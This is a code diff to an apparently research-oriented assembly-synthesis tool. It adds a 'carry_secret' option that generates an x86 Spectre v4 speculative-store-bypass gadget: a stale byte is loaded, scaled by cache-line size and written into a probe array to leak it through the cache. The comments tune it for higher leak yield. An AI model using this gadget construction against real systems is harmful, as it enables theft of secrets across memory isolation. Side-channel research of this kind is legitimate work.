@@ -335,7 +335,8 @@ def _arm_tail_already_shifts_sink(remapped: list[str], sink: str) -> bool:
 
 
 def splice(realized: list[str], arch: str, convention: str,
-           input_expr: str, output_expr: str) -> tuple[str, list[str]]:
+           input_expr: str, output_expr: str,
+           carry_secret: bool = False) -> tuple[str, list[str]]:
     """Ground `realized` into compilable inline-asm text.
 
     Returns (asm_body_text, clobber_list). `asm_body_text` uses "\\n\\t"
@@ -356,6 +357,37 @@ def splice(realized: list[str], arch: str, convention: str,
     canon_regs = find_registers(realized, arch)
     seed = _X86_SEED if arch == "x86_64" else _ARM_SEED
     scratch_pool = _X86_SCRATCH_POOL if arch == "x86_64" else _ARM_SCRATCH_POOL
+
+    # SPECTRE_V4 structural skeleton (carry_secret). The general path maps the
+    # body's first register onto the seed and transmits whatever register the
+    # body last wrote -- so the store-bypass stale value dereferenced from %0
+    # is overwritten by the body and the secret rarely reaches the sink (leak
+    # yield 0.40). carry_secret instead dereferences the stale value into a
+    # RESERVED register the body never touches (scratch_pool[0]), maps the whole
+    # body onto the remaining scratch, and forces the sink to that reserved
+    # register. The store->stale-load->transmit dataflow is then guaranteed; the
+    # generated body is the speculation-window payload. x86 only (V4's oracle is
+    # x86); arm falls through to the general path.
+    if carry_secret and arch == "x86_64":
+        secret = scratch_pool[0]
+        body_pool = scratch_pool[1:]
+        remap: dict[str, str] = {}
+        used_targets: list[str] = []
+        for i, reg in enumerate(canon_regs):
+            target = body_pool[i % len(body_pool)]
+            remap[reg] = target
+            if target not in used_targets:
+                used_targets.append(target)
+        remapped = remap_instrs(realized, arch, remap)
+        lines = [f"movq %0, %{seed}",
+                 f"movzbl (%{seed}), %{secret}d"]   # the bypassed stale load
+        lines.extend(remapped)
+        lines.append(f"shlq ${CACHE_LINE_SHIFT}, %{secret}")
+        lines.append(f"movb $1, (%1,%{secret})")    # transmit the stale secret
+        clobbers = [seed, secret] + used_targets + ["cc"]
+        asm_text = "\\n\\t".join(line.replace("%", "%%") for line in lines)
+        asm_text = asm_text.replace("%%0", "%0").replace("%%1", "%1")
+        return asm_text, clobbers
 
     remap: dict[str, str] = {}
     used_targets: list[str] = []
